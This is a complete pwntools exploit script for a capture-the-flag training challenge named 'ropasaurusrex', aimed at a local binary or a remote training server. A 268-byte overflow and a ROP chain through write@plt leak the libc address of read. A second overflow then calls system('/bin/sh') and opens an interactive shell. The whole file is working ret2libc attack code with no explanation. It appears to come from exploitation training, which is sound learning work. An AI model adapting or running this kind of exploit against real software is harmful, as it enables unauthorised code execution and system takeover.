from pwn import *

context.terminal = ['terminator', '-x', 'sh', '-c']
LIBC_PATH = "./libc-2.39.so"
LIBC = ELF(LIBC_PATH)
CHALL_PATH = "./ropasaurusrex_patched"
CHALL = ELF(CHALL_PATH)


COMMANDS = """
b *0x080491AE
c
"""

if args.REMOTE:
    c= remote("ropasaurusrex.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)

get_input_addr = CHALL.symbols["get_input"]
payload = b"A"*268
payload += p32(CHALL.plt["write"])
payload += p32(get_input_addr)
payload += p32(1)
payload += p32(CHALL.got["read"])
payload += p32(4)

c.recvuntil(b"Input: ")
c.sendline(payload)

libc_leak = c.recv(4)
LIBC.address = u32(libc_leak)-LIBC.symbols["read"] #0x1169b0
print(f"base address of libc : {hex(LIBC.address)}")

system_address = LIBC.symbols["system"]
readelf_system_offset = 0x50430
manual_system_addr = LIBC.address + readelf_system_offset
print(f"address of system : {hex(system_address)}")
print(f"readelf of system : {hex(manual_system_addr)}")
print(f"manual calc from readelf address of system : {hex(manual_system_addr)}")

binsh_address = next(LIBC.search(b"/bin/sh"))
print(f"bin sh address : {binsh_address}")

payload = b"A"*268
payload += p32(system_address)
payload += p32(0xdeadbeef)
payload += p32(binsh_address)

c.recvuntil(b"Input: ")
c.sendline(payload)

c.interactive()
